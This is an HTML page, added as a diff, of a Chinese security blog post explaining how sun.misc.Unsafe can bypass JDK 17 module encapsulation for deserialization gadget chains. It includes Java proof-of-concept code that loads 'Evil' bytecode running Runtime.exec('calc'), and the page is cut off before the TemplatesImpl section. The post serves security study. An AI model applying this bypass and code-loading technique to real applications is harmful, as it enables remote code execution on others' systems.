@@ -1,0 +1,1262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="exp3n5ive">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/09/12/jdk17&cc 下利用 templesimpl/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="原理大概就是利用 Unsafe 类去绕过 Jdk17 下的模块限制，从而允许反序列化时 CC 链中的一些类的使用 Unsafe 类https:&#x2F;&#x2F;www.cnblogs.com&#x2F;nice0e3&#x2F;p&#x2F;14102892.html https:&#x2F;&#x2F;javaguide.cn&#x2F;java&#x2F;basis&#x2F;unsafe.html https:&#x2F;&#x2F;tech.meituan.com&#x2F;2019&#x2F;02&#x2F;14&#x2F;talk-ab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="exp3n5ive&#39; Blog">
+<meta property="og:url" content="http://example.com/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/index.html">
+<meta property="og:site_name" content="exp3n5ive&#39; Blog">
+<meta property="og:description" content="原理大概就是利用 Unsafe 类去绕过 Jdk17 下的模块限制，从而允许反序列化时 CC 链中的一些类的使用 Unsafe 类https:&#x2F;&#x2F;www.cnblogs.com&#x2F;nice0e3&#x2F;p&#x2F;14102892.html https:&#x2F;&#x2F;javaguide.cn&#x2F;java&#x2F;basis&#x2F;unsafe.html https:&#x2F;&#x2F;tech.meituan.com&#x2F;2019&#x2F;02&#x2F;14&#x2F;talk-ab">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-09-12T07:00:50.804Z">
+<meta property="article:modified_time" content="2025-09-12T07:00:30.386Z">
+<meta property="article:author" content="exp3n5ive">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/bemd.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/bemd.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/bemd.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            exp3n5ive&#39; Blog - Redefine Your Hexo Journey.
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":null},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"_","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"YYYY-MM-DD HH:mm:ss","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                exp3n5ive&#39; Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3"></h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/bemd.jpeg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">exp3n5ive</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-09-12 15:50</span>
+        <span class="mobile">2025-09-12 15:50</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-09-12 15:30</span>
+            <span class="mobile">2025-09-12 15:30</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>7.3k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>35 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>原理大概就是利用 Unsafe 类去绕过 Jdk17 下的模块限制，从而允许反序列化时 CC 链中的一些类的使用</p>
+<h1 id="Unsafe-类"><a href="#Unsafe-类" class="headerlink" title="Unsafe 类"></a>Unsafe 类</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14102892.html" >https://www.cnblogs.com/nice0e3/p/14102892.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://javaguide.cn/java/basis/unsafe.html" >https://javaguide.cn/java/basis/unsafe.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html" >https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>Unsafe 是位于 sun.misc 包下的一个类，主要提供一些用于执行低级别、不安全操作的方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756819321898-604bbb11-2f3b-4169-a501-c40e6c6958a1.png"
+                     
+                ></p>
+<h1 id="绕过模块检测原理"><a href="#绕过模块检测原理" class="headerlink" title="绕过模块检测原理"></a>绕过模块检测原理</h1><p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/paPG29rNSy-6a6-QHHz7yA?scene=1&click_id=12" >java安全学习-jdk17绕过反射限制<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13485" >从一道题初接触RASP-先知社区<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://pankas.top/2023/12/05/jdk17-%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/" >JDK17+反射限制绕过<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkwMzQyMTg5OA==&mid=2247488499&idx=1&sn=f0f842040c00ab56ac55983923eb6127&chksm=c15062c9774c76413c5c85b9689d859a8f2b372273959005710202ef60ecc5a9072bc319752a&mpshare=1&scene=1&srcid=09013vcReQRZtA8uHPgr4gxk&sharer_shareinfo=8b06368d047ffac04cc00c838627c68b&sharer_shareinfo_first=8b06368d047ffac04cc00c838627c68b#rd" >JDK 17 强封装与绕过<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>在 Jdk 9-16 采用的都是<strong>宽松的强封装</strong>，当我们用反射去获取 java.* 包下的非public变量和方法时会产生警告</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilBytes();</span><br><span class="line">        ((Class)method.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Evil&quot;</span>, code, <span class="number">0</span>, code.length)).newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilBytes() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evil</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        evil.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> evil.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756867836904-2208e9d7-6b54-40c0-ba40-948c09fcb529.png"
+                     
+                ></p>
+<p>警告归警告，还是可以成功命令执行的：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756867889706-36b139b4-1697-4594-bdaa-eff3574124fc.png"
+                     
+                ></p>
+<p>但是同样的代码拿到 Jdk17 下运行就会产生以下报错：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756868022293-6d2bce9b-85d9-422a-b7ae-7cacc23e81c0.png"
+                     
+                ></p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.reflect.InaccessibleObjectException: Unable to make <span class="keyword">protected</span> <span class="keyword">final</span> java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,<span class="type">byte</span>[],<span class="type">int</span>,<span class="type">int</span>) <span class="keyword">throws</span> java.lang.ClassFormatError accessible: <span class="keyword">module</span> java.base does not <span class="string">&quot;opens java.lang&quot;</span> to unnamed <span class="keyword">module</span> @404b9385</span><br><span class="line">	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:<span class="number">354</span>)</span><br><span class="line">	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:<span class="number">297</span>)</span><br><span class="line">	at java.base/java.lang.reflect.Method.checkCanSetAccessible(Method.java:<span class="number">199</span>)</span><br><span class="line">	at java.base/java.lang.reflect.Method.setAccessible(Method.java:<span class="number">193</span>)</span><br><span class="line">	at Test.main(Test.java:<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这是因为 Jdk 17 启动了强封装， java.* 下的非公共字段和方法都无法反射获取调用了</p>
+<p>跟一下堆栈看看具体是怎么限制的：</p>
+<p>在 setAccessible 方法下断点：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756868580217-d354e570-9ac6-4f03-974f-8ad2f59a8624.png"
+                     
+                ></p>
+<p>这里如果 flag 为 true 就会调用 checkCanSetAccessible 来检测是否可以进行 setAccessible</p>
+<p>在 Jdk8 下也看了一下，发现没有 checkCanSetAccessible 方法：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756868998500-39c5668e-9a48-4f78-9a27-b78af96a5798.png"
+                     
+                ></p>
+<p>所以大概能够确定就是 checkCanSetAccessible 方法限制了对 java.* 的非公共字段和方法的反射</p>
+<p>往下跟，都是对 checkCanSetAccessible 的重载，不重要，最后一直跟到实现具体逻辑的部分：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756869534864-83e8331d-1845-4834-aa16-2aa48696a164.png"
+                     
+                ></p>
+<p>这里直接引用别人的图：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/webp/42454107/1756869631420-1141d1b5-4fca-470b-8d54-38aeb6144066.webp"
+                     
+                ></p>
+<p>重点在第 311 行，只要我们要调用的类的 Module 和 Object.class 的 Module 一样，就可以通过检验</p>
+<p>所以我们可以用 Unsafe 类去修改 caller 类（即 Test）的 Module 即可</p>
+<p>（先调用 objectFieldOffset 获取给定<font style="color:rgb(36, 41, 47);">类属性值的内存偏移量，用来找到 module 属性值的位置，然后调用 getAndSetObject 根据偏移量赋值</font>）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756876166277-cd1c31df-0b8a-4cb6-b985-eae851792228.png"
+                     
+                ></p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 反射获取 Unsafe 类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">unsafeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 修改当前 Test 的 class 类的 Module</span></span><br><span class="line">        <span class="type">Module</span> <span class="variable">baseModule</span> <span class="operator">=</span> Object.class.getModule();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">currentClass</span> <span class="operator">=</span> Test.class;</span><br><span class="line">        <span class="type">long</span> <span class="variable">addr</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">        unsafe.getAndSetObject(currentClass, addr, baseModule);</span><br><span class="line">        <span class="comment">// 反射调用 defineClass 加载字节码</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilBytes();</span><br><span class="line">        ((Class) method.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Evil&quot;</span>, code, <span class="number">0</span>, code.length)).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilBytes() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evil</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        evil.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> evil.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756876393789-dd7c7b0b-96ff-4940-aea1-1c8f87741662.png"
+                     
+                ></p>
+<p><code>unsafe.getAndSetObject(currentClass, addr, baseModule);</code>也可以换成 <code>unsafe.putObject(currentClass, addr, baseModule);</code> </p>
+<p>这个方法是选择了最简单的一条返回 true 的条件去满足的，观察这个方法会看到还有很多返回 true 的地方</p>
+<h1 id="Jdk17-下使用-TemplesImpl-的限制"><a href="#Jdk17-下使用-TemplesImpl-的限制" class="headerlink" title="Jdk17 下使用 TemplesImpl 的限制"></a>Jdk17 下使用 TemplesImpl 的限制</h1><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18628" >https://xz.aliyun.com/news/18628<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
